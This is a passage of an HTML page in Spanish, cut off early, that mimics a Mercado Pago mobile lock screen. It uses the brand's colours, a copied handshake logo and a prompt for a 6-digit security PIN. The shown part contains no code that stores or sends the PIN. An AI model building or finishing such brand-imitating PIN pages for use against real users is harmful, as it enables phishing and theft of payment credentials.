<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Feather Icons -->
    <script src="https://unpkg.com/feather-icons"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #f5f5f5;
        }
        .bg-mp-yellow { background-color: #FFE600; }
        .text-mp-blue { color: #009EE3; }
        .bg-mp-blue { background-color: #009EE3; }
        .bg-mp-blue-dark { background-color: #0081B8; }
        
        .pin-dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            border: 2px solid #ccc;
            transition: all 0.2s ease;
        }
        .pin-dot.filled {
            background-color: #009EE3;
            border-color: #009EE3;
        }
        .hide-scrollbar::-webkit-scrollbar { display: none; }
        .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    </style>
</head>
<body class="flex justify-center items-center min-h-screen bg-gray-200 m-0">

    <!-- Mobile Frame Simulation -->
    <div class="w-full max-w-md h-[100vh] sm:h-[844px] bg-white sm:rounded-3xl shadow-2xl overflow-hidden flex flex-col justify-between relative">
        
        <!-- ==================== PANTALLA 1: LOCKSCREEN (PIN) ==================== -->
        <div id="screen-lock" class="absolute inset-0 bg-white z-50 flex flex-col justify-between p-6">
            <div class="flex justify-between items-center pt-2">
                <span class="text-xs font-semibold text-gray-400">Seguridad</span>
                <button onclick="clearPin()" class="text-xs text-mp-blue font-semibold">Limpiar</button>
            </div>

            <div class="flex flex-col items-center">
                <div class="w-16 h-16 bg-mp-yellow rounded-full flex items-center justify-center mb-6 shadow-md">
                    <!-- Logo Apretón de Manos -->
                    <svg class="w-10 h-10" viewBox="0 0 100 100">
                        <circle cx="50" cy="50" r="46" fill="#009EE3" stroke="#004191" stroke-width="4"/>
                        <path d="M 22 46 C 30 38, 42 38, 50 46 C 58 54, 70 54, 78 46" fill="none" stroke="#FFFFFF" stroke-width="10" stroke-linecap="round"/>
                        <path d="M 22 54 C 30 62, 42 62, 50 54 C 58 46, 70 46, 78 54" fill="none" stroke="#004191" stroke-width="6" stroke-linecap="round"/>
                    </svg>
                </div>
                <h2 class="text-lg font-bold text-gray-800">Ingresa tu clave de 6 dígitos</h2>
                <p id="pin-error
